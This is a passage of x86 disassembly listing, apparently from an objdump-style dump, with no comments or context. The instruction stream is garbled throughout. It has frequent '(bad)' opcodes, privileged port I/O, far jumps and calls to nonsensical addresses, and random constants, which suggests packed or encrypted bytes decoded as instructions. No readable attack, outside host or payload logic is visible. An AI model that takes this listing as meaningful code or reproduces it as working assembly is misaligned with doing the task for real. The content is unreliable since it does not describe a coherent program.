  411865:	sub    BYTE PTR [eax],0x31
  411868:	ss shl bh,0x3e
  41186c:	or     eax,DWORD PTR [ecx-0x64]
  41186f:	scas   al,BYTE PTR es:[edi]
  411870:	push   ecx
  411871:	mov    edx,0x449c699d
  411876:	cmp    ah,dl
  411878:	and    al,0xf4
  41187a:	(bad)  
  41187b:	mov    ds:0x94c7d6ed,al
  411880:	xor    BYTE PTR [edi+ebx*2-0x7b],cl
  411884:	add    BYTE PTR [ebp+0x19],al
  411887:	jmp    0xd116d876
  41188c:	dec    bx
  41188e:	les    edi,FWORD PTR [eax]
  411890:	out    0x8d,al
  411892:	jle    0x4118cc
  411894:	xchg   ebp,eax
  411895:	mov    eax,0x5e3d4a6d
  41189a:	out    0x38,al
  41189c:	(bad)  
  41189d:	jb     0x4118be
  41189f:	lds    esi,FWORD PTR [eax-0x2e]
  4118a2:	inc    edi
  4118a3:	mov    eax,0x3e90b665
  4118a8:	ins    BYTE PTR es:[edi],dx
  4118a9:	ins    BYTE PTR es:[edi],dx
  4118aa:	ins    DWORD PTR es:[edi],dx
  4118ab:	pop    esp
  4118ac:	mov    esp,DWORD PTR [eax-0x50452bd9]
  4118b2:	test   BYTE PTR [ebx],dl
  4118b4:	gs fcmovnu st,st(7)
  4118b7:	or     dh,BYTE PTR [ebp+0x5c1aab55]
  4118bd:	xor    DWORD PTR [ebx-0x33],eax
  4118c0:	popa   
  4118c1:	ret    
  4118c2:	pop    edx
  4118c3:	mov    eax,0x70e4142
  4118c8:	jbe    0x411896
  4118ca:	jmp    0x14082312
  4118cf:	mov    al,ds:0x22e54b7
  4118d4:	or     ch,BYTE PTR [ecx+0x19]
  4118d7:	lods   eax,DWORD PTR ds:[esi]
  4118d8:	stos   DWORD PTR es:[edi],eax
  4118d9:	ficomp WORD PTR [ebx+0x4ba71a9a]
  4118df:	fisttp QWORD PTR [ebp+0x1f]
  4118e2:	test   al,0xfb
  4118e4:	scas   al,BYTE PTR es:[edi]
  4118e5:	dec    ebp
  4118e6:	faddp  st(2),st
  4118e8:	pop    esp
  4118e9:	mov    edx,0xfd23b314
  4118ee:	dec    esp
  4118ef:	inc    esp
  4118f0:	sbb    DWORD PTR [ebp+0xa],ecx
  4118f3:	(bad)  
  4118f5:	pop    ebx
  4118f6:	cmc    
  4118f7:	lds    eax,FWORD PTR [ebx-0x8d8f903]
  4118fd:	aad    0x18
  4118ff:	(bad)  
  411901:	jnp    0x4118f9
  411903:	enter  0x9f9a,0x6e
  411907:	sub    BYTE PTR [edi-0x2c52a87f],bl
  41190d:	ret    0xdf1d
  411910:	pop    ds
  411911:	inc    edi
  411912:	fcmovb st,st(5)
  411914:	out    0x42,al
  411916:	pop    eax
  411917:	jno    0x4118de
  411919:	dec    edi
  41191a:	jae    0x41197d
  41191c:	in     eax,dx
  41191d:	loope  0x411972
  41191f:	ret    0x2ff1
  411922:	push   ds
  411923:	cmp    al,0xd4
  411925:	mov    dl,0xd
  411927:	adc    al,BYTE PTR [eax+0x26bf1935]
  41192d:	lods   eax,DWORD PTR ds:[esi]
  41192e:	in     eax,0x8e
  411930:	xor    dh,BYTE PTR [edx]
  411932:	mov    dh,0xda
  411934:	lds    edi,FWORD PTR [edi+ebx*4+0x2f26d363]
  41193b:	xor    al,0x6e
  41193d:	pop    ecx
  41193e:	cld    
  41193f:	call   0xc9764189
  411944:	adc    al,0x9f
  411946:	push   eax
  411947:	xchg   esp,eax
  411948:	test   BYTE PTR [edx-0x20],ch
  41194b:	in     al,dx
  41194c:	cmp    eax,0xf59f7ead
  411951:	js     0x4118f9
  411953:	mov    DWORD PTR [edx+0x4011937e],edx
  411959:	stos   DWORD PTR es:[edi],eax
  41195a:	adc    esp,DWORD PTR [edx]
  41195c:	pop    es
  41195d:	sub    eax,0xfbae7ddf
  411962:	cwde   
  411963:	mov    ?,WORD PTR [edi]
  411965:	mov    fs,edx
  411967:	addr16 pop edi
  411969:	xor    eax,0xb79b5f8e
  41196e:	sub    esp,0x19
  411971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411972:	jecxz  0x4119dc
  411974:	jle    0x41197e
  411976:	push   ebx
  411977:	stos   DWORD PTR es:[edi],eax
  411978:	mov    esp,0xcc39a379
  41197d:	jecxz  0x4119b6
  41197f:	out    dx,eax
  411980:	lea    ebx,[eax+eax*2-0x80]
  411984:	mov    ds:0x59afd5cf,al
  411989:	add    eax,0x5159e8f5
  41198e:	xchg   ebx,eax
  41198f:	xchg   esp,eax
  411990:	ins    BYTE PTR es:[edi],dx
  411991:	test   eax,0xf895967b
  411996:	int    0x5c
  411998:	sbb    bh,bl
  41199a:	jb     0x411a0c
  41199c:	lahf   
  41199d:	lds    ebp,FWORD PTR [esi]
  41199f:	mov    ebp,0x3a161b71
  4119a4:	(bad)  
  4119a5:	arpl   WORD PTR [edi],bp
  4119a7:	fstp   QWORD PTR [eax]
  4119a9:	ficom  DWORD PTR [ecx+esi*8]
  4119ac:	and    DWORD PTR [edi],ebx
  4119ae:	push   edi
  4119af:	dec    esp
  4119b0:	xchg   esi,eax
  4119b1:	ror    DWORD PTR [ebx+0x7d],1
  4119b4:	popf   
  4119b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119b6:	sub    al,0x11
  4119b8:	mov    ebp,0x54d52e17
  4119bd:	rcr    BYTE PTR [edx],1
  4119bf:	fs stc 
  4119c1:	hlt    
  4119c2:	dec    esp
  4119c3:	rcl    ch,0x92
  4119c6:	dec    edx
  4119c7:	lock enter 0xd16a,0xfc
  4119cc:	mov    cl,0xbf
  4119ce:	xor    DWORD PTR [ebx+0x3c],ebp
  4119d1:	or     dl,BYTE PTR [edi]
  4119d3:	retf   0x4bb6
  4119d6:	jb     0x4119f8
  4119d8:	rcr    DWORD PTR [ecx-0x80],1
  4119db:	mov    al,ds:0xafa63af8
  4119e0:	add    dh,cl
  4119e2:	push   esp
  4119e3:	lahf   
  4119e4:	shl    DWORD PTR [ebp+0x20b9e602],cl
  4119ea:	inc    ecx
  4119eb:	xor    al,0x40
  4119ed:	out    dx,al
  4119ee:	outs   dx,DWORD PTR ds:[esi]
  4119ef:	pusha  
  4119f0:	out    dx,eax
  4119f1:	xor    eax,0xd38fac9e
  4119f6:	sub    eax,0xaaa86ba2
  4119fb:	xchg   esp,eax
  4119fc:	cdq    
  4119fd:	dec    ebp
  4119fe:	sti    
  4119ff:	cwde   
  411a00:	pushf  
  411a01:	test   al,0x57
  411a03:	xchg   ecx,eax
  411a04:	add    ah,BYTE PTR [eax+edx*4]
  411a07:	pusha  
  411a08:	mov    ebp,0x4bb75e9c
  411a0d:	fwait
  411a0e:	mov    ebp,0x4249b28b
  411a13:	and    al,BYTE PTR [edx+edx*2]
  411a16:	test   BYTE PTR [eax],dl
  411a18:	mov    eax,0xacd6974a
  411a1d:	xchg   edx,eax
  411a1e:	xchg   ecx,eax
  411a1f:	dec    ebp
  411a20:	fld    DWORD PTR [eax]
  411a22:	mov    ah,0xe0
  411a24:	mov    esi,0x55abbb3
  411a29:	fwait
  411a2a:	adc    ch,dl
  411a2c:	clc    
  411a2d:	sbb    ah,BYTE PTR [ecx]
  411a2f:	mov    bl,0xc8
  411a31:	ins    DWORD PTR es:[edi],dx
  411a32:	ret    
  411a33:	cli    
  411a34:	xchg   DWORD PTR [edx+0x1ff71c27],ecx
  411a3a:	fadd   DWORD PTR [ebp-0xdcef0e7]
  411a40:	push   0xc48e66b5
  411a45:	gs sub eax,0xba1942dd
  411a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a4c:	imul   edx,ebx,0xffffffc8
  411a4f:	jle    0x411a6b
  411a51:	jl     0x411ab9
  411a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a54:	jae    0x411aa1
  411a56:	sbb    al,0x34
  411a58:	popf   
  411a59:	xchg   esp,eax
  411a5a:	sub    BYTE PTR [edi],ch
  411a5c:	mov    ss,WORD PTR [edi+0x330a01b]
  411a62:	inc    esp
  411a63:	and    eax,0x519790f4
  411a68:	xchg   ecx,eax
  411a69:	jp     0x411ab4
  411a6b:	jo     0x4119ef
  411a6d:	mov    DWORD PTR [ebp+0x472e30a],esi
  411a73:	punpckhdq mm5,QWORD PTR [ebx+0x674eadf0]
  411a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a7b:	std    
  411a7c:	sub    al,0xbe
  411a7e:	or     DWORD PTR [ebp+eax*1+0x3],ebp
  411a82:	cmp    dh,BYTE PTR ds:0xc6bd457b
  411a88:	clc    
  411a89:	fsub   QWORD PTR [ecx-0x43]
  411a8c:	sub    DWORD PTR [edi+0x39],0x1a90235b
  411a93:	sbb    BYTE PTR [ebp+ecx*2-0x64483b2e],dh
  411a9a:	mov    bh,cl
  411a9c:	stos   BYTE PTR es:[edi],al
  411a9d:	in     eax,0x7c
  411a9f:	jnp    0x411a27
  411aa1:	inc    ebp
  411aa2:	jbe    0x411a5f
  411aa4:	add    BYTE PTR [ebx-0x32a71446],bh
  411aaa:	repnz inc ebx
  411aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aad:	cmp    ebp,0x2ca16264
  411ab3:	not    BYTE PTR [ebx+0xc]
  411ab6:	mov    cl,0x47
  411ab8:	enter  0xc23e,0xf7
  411abc:	or     al,0xe
  411abe:	inc    edx
  411abf:	out    dx,al
  411ac0:	mov    es,eax
  411ac2:	push   edi
  411ac3:	cmp    BYTE PTR [edi-0x28],0xa0
  411ac7:	pop    ebx
  411ac8:	outs   dx,BYTE PTR ds:[esi]
  411ac9:	jp     0x411aef
  411acb:	mov    esp,0xf7c6d1f3
  411ad0:	(bad)  
  411ad2:	sub    DWORD PTR [ebx+0x64],edx
  411ad5:	mov    al,0xc8
  411ad7:	add    ebx,DWORD PTR [ebp+0x138dc5d7]
  411add:	rol    BYTE PTR [edx+0x6a528fff],1
  411ae3:	inc    esi
  411ae4:	pop    ebp
  411ae5:	xchg   edi,eax
  411ae6:	jg     0x411b5c
  411ae8:	or     al,BYTE PTR [esi+ebp*4-0x4b]
  411aec:	int3   
  411aed:	(bad)  
  411aee:	in     al,0xae
  411af0:	outs   dx,BYTE PTR ds:[esi]
  411af1:	and    BYTE PTR [ecx+0x18],dl
  411af4:	test   DWORD PTR [ebx+0x76af208c],0xe93f99cf
  411afe:	jno    0x411b70
  411b00:	xor    BYTE PTR [ebx-0x42656466],ah
  411b06:	mov    bh,0x31
  411b08:	ja     0x411b26
  411b0a:	xchg   edi,eax
  411b0b:	retf   
  411b0c:	mov    esi,0x4b4b42ec
  411b11:	push   edx
  411b12:	pop    es
  411b13:	lds    esp,FWORD PTR [ebp+0x3768faac]
  411b19:	nop
  411b1a:	adc    cl,BYTE PTR [eax-0x7c12d0f1]
  411b20:	adc    DWORD PTR [ebx-0x39eada6b],esi
  411b26:	outs   dx,BYTE PTR ds:[esi]
  411b27:	mov    esi,0x2e15fc7f
  411b2c:	and    al,0xb5
  411b2e:	or     al,0x33
  411b30:	sti    
  411b31:	pop    ds
  411b32:	mov    DWORD PTR [edi-0x64996867],esi
  411b38:	mov    edi,0x387fa7d5
  411b3d:	push   ecx
  411b3e:	call   0x7c2e565e
  411b43:	repnz mov ds:0xe7cc564c,al
  411b49:	lods   eax,DWORD PTR ds:[esi]
  411b4a:	xlat   BYTE PTR ds:[ebx]
  411b4b:	inc    eax
  411b4c:	dec    edx
  411b4d:	mov    dh,0x38
  411b4f:	fldenv ss:[ebx]
  411b52:	pop    esp
  411b53:	das    
  411b54:	pushf  
  411b55:	or     eax,0xb3ec1461
  411b5a:	fistp  DWORD PTR gs:[ebx+0x6f402000]
  411b61:	adc    ah,ch
  411b63:	pop    esi
  411b64:	(bad)  
  411b65:	daa    
  411b66:	lds    esp,FWORD PTR [eax+0x2faefb6f]
  411b6c:	pop    edx
  411b6d:	pusha  
  411b6e:	(bad)  
  411b6f:	cli    
  411b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b71:	cwde   
  411b72:	push   ebp
  411b73:	adc    dl,al
  411b75:	clc    
  411b76:	ins    BYTE PTR es:[edi],dx
  411b77:	repnz cli 
  411b79:	dec    ecx
  411b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b7b:	lock std 
  411b7d:	test   DWORD PTR [esi+0x4a],edx
  411b80:	js     0x411b32
  411b82:	aad    0x59
  411b84:	mov    ah,BYTE PTR [ebx]
  411b86:	cmp    DWORD PTR [edx-0x21f0c81a],eax
  411b8c:	mov    ah,BYTE PTR [ebp+0x78fe90f]
  411b92:	dec    esi
  411b93:	aad    0xac
  411b95:	(bad)  
  411b96:	(bad)  
  411b98:	out    dx,al
  411b99:	dec    esp
  411b9a:	or     eax,0x9e16ef1
  411b9f:	mov    WORD PTR [edx+0x32],?
  411ba2:	xchg   ebp,eax
  411ba3:	sub    eax,0xf968f5e7
  411ba8:	mov    ds:0xabbf9be6,eax
  411bad:	xchg   ebx,eax
  411bae:	add    al,ch
  411bb0:	test   DWORD PTR [edi],eax
  411bb2:	enter  0xce63,0xbf
  411bb6:	int    0x32
  411bb8:	sbb    DWORD PTR [ecx],ebp
  411bba:	xlat   BYTE PTR ds:[ebx]
  411bbb:	adc    dl,BYTE PTR [ebx-0x70d1a37]
  411bc1:	xor    al,0xb1
  411bc3:	popf   
  411bc4:	daa    
  411bc5:	pop    DWORD PTR [ebp+0x50f27d88]
  411bcb:	xchg   ebp,eax
  411bcc:	add    al,0x4d
  411bce:	rol    DWORD PTR [ebx+0x57],0xe5
  411bd2:	mov    esi,0xc674aa3f
  411bd7:	lahf   
  411bd8:	imul   ecx,eax,0xffffff8a
  411bdb:	sahf   
  411bdc:	sbb    BYTE PTR [ebx],0xb
  411bdf:	daa    
  411be0:	enter  0xd251,0xed
  411be4:	(bad)  
  411be5:	adc    al,BYTE PTR [eax]
  411be7:	adc    dh,BYTE PTR [ebp+0x5e]
  411bea:	xor    bh,bh
  411bec:	adc    al,0xc
  411bee:	ror    DWORD PTR [ecx],0xd
  411bf1:	jmp    0x411c0f
  411bf3:	xor    al,0xd3
  411bf5:	and    BYTE PTR [ecx],ah
  411bf7:	push   ebp
  411bf8:	fdivr  QWORD PTR [eax-0xb6cd730]
  411bfe:	es repz in eax,0xd6
  411c02:	mov    al,ds:0x83201966
  411c07:	in     al,dx
  411c08:	(bad)  
  411c09:	rcr    BYTE PTR [edx+eiz*8],0xba
  411c0d:	adc    dh,BYTE PTR [esp+eax*8-0x6deac9ed]
  411c14:	jae    0x411bc1
  411c16:	or     edi,edx
  411c18:	int3   
  411c19:	ret    0x84c6
  411c1c:	fs jno 0x411bd7
  411c1f:	rcr    BYTE PTR [esi-0x61],0xd0
  411c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c24:	ret    0x784d
  411c27:	mov    cl,0x3c
  411c29:	dec    eax
  411c2a:	jb     0x411be9
  411c2c:	test   eax,0x64630f54
  411c31:	xor    esi,DWORD PTR [edi]
  411c33:	(bad)  
  411c34:	scas   eax,DWORD PTR es:[edi]
  411c35:	mov    ecx,0x18474261
  411c3a:	fnstsw WORD PTR [eax+0x3a6904d8]
  411c40:	push   ecx
  411c41:	fsubr  st,st(0)
  411c43:	loopne 0x411ca4
  411c45:	int3   
  411c46:	cmp    eax,DWORD PTR [edx]
  411c48:	dec    ecx
  411c49:	lahf   
  411c4a:	sub    eax,DWORD PTR [edi+0x5f]
  411c4d:	add    al,0x11
  411c4f:	push   edx
  411c50:	pusha  
  411c51:	out    0x89,al
  411c53:	push   ss
  411c54:	mov    esp,0x2cb117fc
  411c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c5a:	popa   
  411c5b:	(bad)  
  411c5c:	pusha  
  411c5d:	xor    eax,0x15aebca6
  411c62:	outs   dx,BYTE PTR ds:[esi]
  411c63:	sub    ebx,DWORD PTR [ebp+0x1dbcb6a6]
  411c69:	out    dx,al
  411c6a:	(bad)  
  411c6b:	push   0xcc285087
  411c70:	mov    ds:0x5f042186,eax
  411c75:	std    
  411c76:	sub    DWORD PTR [esi-0x51],esi
  411c79:	xchg   edx,eax
  411c7a:	jae    0x411cef
  411c7c:	mov    al,BYTE PTR ds:0xde5a4b1
  411c82:	xchg   bl,al
  411c84:	jg     0x411c93
  411c86:	jge    0x411c49
  411c88:	stc    
  411c89:	sbb    al,0x87
  411c8b:	ret    0x4279
  411c8e:	fwait
  411c8f:	and    eax,0xa155c3fd
  411c94:	nop
  411c95:	out    0x28,eax
  411c97:	adc    eax,0x92b14fbd
  411c9c:	in     al,dx
  411c9d:	mov    edx,0x481464d
  411ca2:	test   BYTE PTR [ebp-0x4e8f2811],bh
  411ca8:	in     al,dx
  411ca9:	and    DWORD PTR [esi-0x5],edx
  411cac:	test   DWORD PTR ds:0x38c530b1,edi
  411cb2:	fmul   DWORD PTR [esi]
  411cb4:	adc    eax,0x4abb1642
  411cb9:	jae    0x411c6c
  411cbb:	mov    cl,bl
  411cbd:	or     al,0x3a
  411cbf:	stos   BYTE PTR es:[edi],al
  411cc0:	mov    dl,0x8
  411cc2:	test   DWORD PTR [eax+0x28e587bd],0xdcf2297e
  411ccc:	imul   ebx,DWORD PTR [ecx+0x21e39b0c],0xffffff9c
  411cd3:	fwait
  411cd4:	push   ss
  411cd5:	xchg   ebp,eax
  411cd6:	shr    DWORD PTR [ebx],1
  411cd8:	cmp    BYTE PTR [edx+0x7bc1f502],dl
  411cde:	into   
  411cdf:	jne    0x411cb0
  411ce1:	or     al,0xe6
  411ce3:	xchg   ecx,eax
  411ce4:	pop    ebx
  411ce5:	dec    ebx
  411ce6:	cdq    
  411ce7:	test   eax,0x354bcf6
  411cec:	jne    0x411cb9
  411cee:	adc    BYTE PTR [ecx-0x900540d],bl
  411cf4:	lods   eax,DWORD PTR ds:[esi]
  411cf5:	jmp    0x411d1a
  411cf7:	pop    ecx
  411cf8:	and    al,0xa
  411cfa:	push   edx
  411cfb:	stos   DWORD PTR es:[edi],eax
  411cfc:	push   es
  411cfd:	adc    al,0xc8
  411cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d00:	mov    edx,0x208a174e
  411d05:	sar    ebx,0x36
  411d08:	add    eax,0x28802fd5
  411d0d:	and    eax,0x365a028b
  411d12:	cmp    al,0x7a
  411d14:	ins    DWORD PTR es:[edi],dx
  411d15:	dec    ebp
  411d16:	or     BYTE PTR [eax],ah
  411d18:	add    ecx,ebp
  411d1a:	jbe    0x411cd9
  411d1c:	ss in  eax,dx
  411d1e:	cmp    al,0x23
  411d20:	fnsave [edx+ebx*4-0x1f]
  411d24:	adc    BYTE PTR [eax-0x7d26ff2d],dl
  411d2a:	aad    0xee
  411d2c:	dec    esp
  411d2d:	adc    DWORD PTR [ebx+ebx*1-0x71],edi
  411d31:	(bad)  
  411d32:	jg     0x411d02
  411d34:	pop    es
  411d35:	push   edx
  411d36:	push   ss
  411d37:	stc    
  411d38:	pop    esp
  411d39:	test   BYTE PTR [edx-0x1d46af04],ch
  411d3f:	rol    DWORD PTR [edx+eiz*4-0x65e7a20a],0xb0
  411d47:	pop    edi
  411d48:	pop    ecx
  411d49:	enter  0x5f42,0x5a
  411d4d:	jecxz  0x411cf8
  411d4f:	call   0xca18:0x10d1b895
  411d56:	in     al,0x2e
  411d58:	push   ebx
  411d59:	mov    dl,0x8e
  411d5b:	inc    DWORD PTR [edi+0x6d]
  411d5e:	add    al,0x8
  411d60:	push   ecx
  411d61:	cwde   
  411d62:	in     al,0x16
  411d64:	add    BYTE PTR [ebx-0x2e9d2833],bl
  411d6a:	mov    BYTE PTR [edx],ch
  411d6c:	aad    0x10
  411d6e:	(bad)  
  411d6f:	div    BYTE PTR [esi+eiz*2-0x59]
  411d73:	jge    0x411d8d
  411d75:	jp     0x411d32
  411d77:	das    
  411d78:	cli    
  411d79:	and    eax,0x7c4f1ae9
  411d7e:	xchg   esp,eax
  411d7f:	cli    
  411d80:	sub    DWORD PTR [ebp-0x31ad8baa],ecx
  411d86:	imul   DWORD PTR [ecx]
  411d88:	dec    esp
  411d89:	imul   esi,DWORD PTR [edi],0xffffffe7
  411d8c:	lods   eax,DWORD PTR ds:[esi]
  411d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d8e:	jne    0x411e07
  411d90:	push   ecx
  411d91:	aaa    
  411d92:	or     eax,0xae31c926
  411d97:	xor    ebp,DWORD PTR [eax]
  411d99:	dec    ebp
  411d9a:	scas   eax,DWORD PTR es:[edi]
  411d9b:	sub    esp,DWORD PTR [ebx-0x4f]
  411d9e:	or     DWORD PTR [esp+edx*8-0x6],ebp
  411da2:	push   ds
  411da3:	hlt    
  411da4:	cmp    DWORD PTR [edi-0x5a1b6929],edx
  411daa:	test   DWORD PTR [ecx-0x1d],0x183a3e3
  411db1:	mov    ebp,0xdc829aa0
  411db6:	sub    DWORD PTR [ebx],0x7812ae46
  411dbc:	pop    ds
  411dbd:	int3   
  411dbe:	cmp    bl,al
  411dc0:	mov    ebp,0x6b19644b
  411dc5:	add    BYTE PTR [ebx-0x15],cl
  411dc8:	popa   
  411dc9:	sbb    BYTE PTR [eax-0x7d5bb8a0],dh
  411dcf:	retf   0x401f
  411dd2:	cmp    bh,al
  411dd4:	jg     0x411d89
  411dd6:	sbb    edx,DWORD PTR [edx-0x6c83aede]
  411ddc:	or     ecx,esp
  411dde:	aaa    
  411ddf:	mov    dh,0xf1
  411de1:	ficom  WORD PTR [ebx+0x3ceb82ab]
  411de7:	mov    ch,0x35
  411de9:	les    ebx,FWORD PTR [ebx]
  411deb:	cmp    eax,0xb9966220
  411df0:	mov    bl,0x19
  411df2:	and    edx,DWORD PTR [esp+esi*8+0x3b]
  411df6:	jns    0x411da8
  411df8:	push   esp
  411df9:	in     eax,dx
  411dfa:	addr16 (bad) 
  411dfd:	and    eax,0xca4b2f
  411e02:	sbb    eax,DWORD PTR [edx]
  411e04:	stc    
  411e05:	inc    ebx
  411e06:	mov    bh,0xfa
  411e08:	in     eax,0xef
  411e0a:	inc    esi
  411e0b:	and    al,0x84
  411e0d:	cmp    DWORD PTR [eax],edx
  411e0f:	leave  
  411e10:	inc    eax
  411e11:	sub    ah,BYTE PTR [edi-0x5a816602]
  411e17:	pop    esp
  411e18:	sub    BYTE PTR [eax],0x82
  411e1b:	sbb    BYTE PTR [ebx+0x359f82ba],bh
  411e21:	push   esp
  411e22:	cmp    al,0x51
  411e24:	loopne 0x411e0e
  411e26:	or     ebp,DWORD PTR [ebp+0x5e]
  411e29:	rcr    BYTE PTR [ebx+0xecb96e],1
  411e2f:	xchg   DWORD PTR [edi],esi
  411e31:	jmp    0x898a:0xbb0ef5e7
  411e38:	(bad)  
  411e39:	xchg   DWORD PTR [edx+0x42],edi
  411e3c:	in     al,0x77
  411e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e3f:	xlat   BYTE PTR ds:[ebx]
  411e40:	lods   eax,DWORD PTR ds:[si]
  411e42:	mov    ch,0x9
  411e44:	mov    dl,0x10
  411e46:	popa   
  411e47:	(bad)  
  411e48:	cld    
  411e49:	test   eax,0xff5f9018
  411e4e:	inc    esi
  411e4f:	ins    BYTE PTR es:[edi],dx
  411e50:	add    DWORD PTR [ebp+0x54],0x50
  411e54:	sti    
  411e55:	std    
  411e56:	sti    
  411e57:	inc    edi
  411e58:	push   es
  411e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e5a:	mov    gs,WORD PTR [edi+0x2160ecaf]
  411e60:	dec    ebx
  411e61:	push   ss
  411e62:	pop    ebp
  411e63:	(bad)  
  411e65:	in     al,dx
  411e66:	jle    0x411e44
  411e68:	ss xchg edx,eax
  411e6a:	adc    esp,edi
  411e6c:	dec    edx
  411e6d:	inc    esi
  411e6e:	adc    eax,0x62f2deb4
  411e73:	loopne 0x411e04
  411e75:	pop    edx
  411e76:	shr    esp,0xde
  411e79:	popf   
  411e7a:	mov    ds:0xa67cb1c6,eax
  411e7f:	pop    ebp
  411e80:	dec    DWORD PTR fs:[ebx-0x38]
  411e84:	xor    eax,0x193f7b07
  411e89:	fmul   QWORD PTR [eax+0x1b47badd]
  411e8f:	xor    ebx,DWORD PTR [eax-0x532b9fed]
  411e95:	and    DWORD PTR [ebx-0x5e],ebx
  411e98:	dec    edi
  411e99:	test   BYTE PTR [ebx],al
  411e9b:	mov    esp,0x590f774b
  411ea0:	mov    ah,BYTE PTR [ecx]
  411ea2:	mov    ebp,0x85c3dde1
  411ea7:	test   DWORD PTR ss:0xee941538,edx
  411eae:	(bad)  
  411eb0:	dec    ebx
  411eb1:	ds (bad) 
  411eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eb4:	mov    ds:0xbc0be5c2,eax
  411eb9:	jnp    0x411e47
  411ebb:	push   ebp
  411ebc:	jno    0x411f09
  411ebe:	inc    esp
  411ebf:	pop    edi
  411ec0:	dec    eax
  411ec1:	jle    0x411e86
  411ec3:	jge    0x411efd
  411ec5:	inc    ebp
  411ec6:	out    dx,al
  411ec7:	lods   eax,DWORD PTR ds:[esi]
  411ec8:	cmp    eax,DWORD PTR [ecx-0x2a989a4d]
  411ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ecf:	sub    DWORD PTR [eax-0x1c02fe83],esp
  411ed5:	or     esp,DWORD PTR [edi]
  411ed7:	clc    
  411ed8:	adc    eax,0x4a3b5f48
  411edd:	xchg   edi,eax
  411ede:	sar    DWORD PTR [esi+0x76144bfe],0x5a
  411ee5:	push   0xffffffb1
  411ee7:	pop    eax
  411ee8:	js     0x411eef
  411eea:	leave  
  411eeb:	pop    esi
  411eec:	call   0x501db178
  411ef1:	mov    ecx,0xde598e9f
  411ef6:	popf   
  411ef7:	sahf   
  411ef8:	dec    edx
  411ef9:	jb     0x411ecf
  411efb:	xor    dl,BYTE PTR [edi-0x63]
  411efe:	loope  0x411f27
  411f00:	cmp    eax,0x99259962
  411f05:	add    al,0xbc
  411f07:	mov    ds:0xb7b7afe8,al
  411f0c:	push   cs
  411f0d:	jnp    0x411ea0
  411f0f:	std    
  411f10:	push   ecx
  411f11:	out    0xa4,al
  411f13:	pushf  
  411f14:	jmp    FWORD PTR [edi]
  411f16:	test   al,0xe3
  411f18:	(bad)  
  411f19:	fstp   TBYTE PTR [eax-0x1dee6766]
  411f1f:	add    BYTE PTR [esi+0x53cfe2f6],bl
  411f25:	out    0x30,al
  411f27:	aas    
  411f28:	xor    ebx,DWORD PTR [ebp+eiz*1+0x6f471fbb]
  411f2f:	mov    bh,BYTE PTR [ebx+0x38eb252d]
  411f35:	mov    esi,gs
  411f37:	pop    esi
  411f38:	mov    esp,0x6d1f0c32
  411f3d:	jnp    0x411f78
  411f3f:	xor    al,0xb7
  411f41:	and    eax,0x1551f488
  411f46:	inc    ebp
  411f47:	aaa    
  411f48:	(bad)  
  411f49:	lock push ecx
  411f4b:	jnp    0x411f90
  411f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f4e:	add    al,0x5d
  411f50:	or     BYTE PTR [edx-0x424b521e],0xc8
  411f57:	(bad)  
  411f58:	(bad)  
  411f5a:	sahf   
  411f5b:	or     eax,0x29e49ba4
  411f60:	mov    ah,0xb0
  411f62:	push   ecx
  411f63:	(bad)  
  411f64:	sahf   
  411f65:	and    edi,DWORD PTR ds:0xafc30bbe
  411f6b:	ins    DWORD PTR es:[edi],dx
  411f6c:	pop    ss
  411f6d:	outs   dx,BYTE PTR ds:[esi]
  411f6e:	or     eax,ebx
  411f70:	jnp    0x411f97
  411f72:	sub    ah,al
  411f74:	test   eax,0xea6dd25a
  411f79:	sbb    DWORD PTR [eax],0xf9fe1405
  411f7f:	cmp    dl,BYTE PTR [ebx+0x60]
  411f82:	sbb    al,0x2e
  411f84:	ja     0x411ffb
  411f86:	enter  0x1205,0x48
  411f8a:	mov    BYTE PTR ds:0xdbadd893,ah
  411f90:	jb     0x9aaff624
  411f96:	in     eax,dx
  411f97:	in     eax,0xbd
  411f99:	mov    edi,DWORD PTR [ebx-0x3c48dd70]
  411f9f:	fiadd  DWORD PTR [edx+0x6c58dadb]
  411fa5:	xor    bh,dh
  411fa7:	xchg   ebp,eax
  411fa8:	mov    ds:0x50d986f9,al
  411fad:	sahf   
  411fae:	inc    edi
  411faf:	jg     0x411f37
  411fb1:	les    ebx,FWORD PTR [ebx+0x74]
  411fb4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  411fb6:	aaa    
  411fb7:	rcr    BYTE PTR [edi],cl
  411fb9:	push   eax
  411fba:	in     eax,dx
  411fbb:	mov    al,BYTE PTR [edx+edx*4-0x20]
  411fbf:	dec    edx
  411fc0:	cdq    
  411fc1:	test   BYTE PTR [ecx],bl
  411fc3:	rcr    BYTE PTR ds:0xfbe80718,1
  411fc9:	or     ebp,DWORD PTR [edx]
  411fcb:	sbb    DWORD PTR [eax+ebp*4],ecx
  411fce:	frstor [eax]
  411fd0:	ror    edi,cl
  411fd2:	adc    DWORD PTR ds:0xcd9c9d5d,eax
  411fd8:	es add eax,0x628da8ca
  411fde:	pop    edx
  411fdf:	lods   eax,DWORD PTR ds:[esi]
  411fe0:	fbstp  TBYTE PTR [edx]
  411fe2:	adc    bl,BYTE PTR [ecx-0x58]
  411fe5:	sbb    DWORD PTR [edi+eax*1+0x5d8bb63c],ebp
  411fec:	mov    ch,0xc5
  411fee:	lds    edx,FWORD PTR [esp+ecx*2]
  411ff1:	pop    esp
  411ff2:	popf   
  411ff3:	mov    al,ds:0xfaee58bf
  411ff8:	xchg   esp,eax
  411ff9:	test   DWORD PTR [ecx+edx*2+0x5caec795],0x9d023c07
